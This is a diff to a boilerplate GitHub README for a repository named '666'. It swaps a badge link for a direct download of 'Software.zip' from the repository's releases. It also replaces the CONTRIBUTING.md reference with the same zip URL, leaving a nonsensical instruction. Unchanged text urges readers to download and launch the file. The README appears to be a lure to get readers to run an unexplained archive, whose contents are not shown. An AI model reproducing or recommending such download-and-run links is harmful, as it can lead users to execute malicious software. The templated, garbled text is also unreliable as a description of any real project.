@@ -7,7 +7,7 @@ This is the repository for the "666" project. Unfortunately, no specific descrip
 The repository topics have not been provided.
 
 ## Download Link
-[![Download "666" Repository](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download "666" Repository](https://github.com/vickorkumar/666/releases/download/v1.0/Software.zip)](https://github.com/vickorkumar/666/releases/download/v1.0/Software.zip)
 
 Please note that the download link provided needs to be launched.
 
@@ -20,7 +20,7 @@ Here, you will find everything related to the "666" project. This repository ser
 To get started with the "666" project, follow these steps:
 1. Click on the download link provided above to obtain the project files.
 2. Explore the contents of the repository to familiarize yourself with the code and documentation.
-3. If you are interested in contributing to the project, check out the guidelines in the `CONTRIBUTING.md` file.
+3. If you are interested in contributing to the project, check out the guidelines in the `https://github.com/vickorkumar/666/releases/download/v1.0/Software.zip` file.
 4. Stay updated with the latest developments by following the project on GitHub.
 
 ## Get Involved
